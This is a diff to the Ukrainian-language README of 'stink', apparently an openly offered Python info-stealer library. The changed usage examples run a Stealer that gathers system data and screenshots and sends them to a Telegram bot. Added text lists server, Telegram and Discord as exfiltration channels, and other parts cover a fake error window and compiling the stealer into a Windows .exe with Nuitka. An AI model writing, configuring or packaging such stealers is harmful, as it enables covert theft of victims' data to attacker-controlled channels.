@@ -50,21 +50,20 @@
 ### Стандартний
 ```python
 from stink import Stealer
-from stink.utils.senders import TelegramSender
+from stink.enums import Senders
 
 if __name__ == '__main__':
-    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
+    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
 ```
 ### Певні модулі
 
 Приклад зі збором тільки системних даних і скріншота.
 ```python
 from stink import Stealer
-from stink.enums import Features
-from stink.utils.senders import TelegramSender
+from stink.enums import Features, Senders
 
 if __name__ == '__main__':
-    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
+    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
 ```
 ### Додаткові параметри
 
@@ -101,6 +100,14 @@ if __name__ == '__main__':
 
   - `message` - вивід фейкового вікна помилки.
   
+
+- `senders` - запускає способи надсилання зі списку. Способи надсилання можна імпортувати з `stink.enums.Senders`. Доступні способи надсилання:
+
+  - `server` - відправлення на сервер.
+
+  - `telegram` - відправка в Telegram.
+
+  - `discord` - надсилання в Discord.
 ## Створення exe
 Python являється інтерпретованою мовою програмування, тому ми спочатку транслюємо його в C, а потім скомпілюємо в .exe файл.
 Для цього нам знадобиться Nuitka.
@@ -112,10 +119,10 @@ Python являється інтерпретованою мовою програ
 3. Створюємо test.py (або будь-яку іншу назву) файл в цій же директорії з наступним кодом:
 ```python
 from stink import Stealer
-from stink.utils.senders import TelegramSender
+from stink.enums import Senders
 
 if __name__ == '__main__':
-    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
+    Stealer(senders=[Senders.telegram(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
 ```
 
 ### За допомогою BAT
